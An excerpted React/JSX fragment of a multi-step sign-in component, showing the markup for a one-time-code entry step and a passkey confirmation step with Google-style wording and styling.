        ...
        switch(currentStep) {
            ...
            case 'auth_otp':
                return (
                    <div className="relative w-full">
                        ...
                        <label
                            htmlFor="otpField"
                            className="absolute left-3 top-3.5 px-1 bg-white transition-all duration-200 text-[#1f1f1f] peer-focus:-top-2 peer-focus:text-sm peer-focus:text-blue-500 peer-focus:bg-white"
                        >
            ...
            case 'passkeys':
                return (
                    <div className="w-full text-center">
                        <div className="my-6">
                            <div className="text-2xl google font-medium">Use your passkey</div>
                            <p className="mt-4 text-gray-600">Confirm it's really you with your device's security</p>
                            <div className="my-8">
                                <button className="bg-blue-600 text-white px-6 py-3 rounded-full hover:bg-blue-700 transition-colors">
                                    Continue with passkey
                                </button>
                            </div>
                            <p className="text-gray-600">Not working? <button className="text-blue-600">Use another option</button></p>
                        </div>
                    </div>
                );
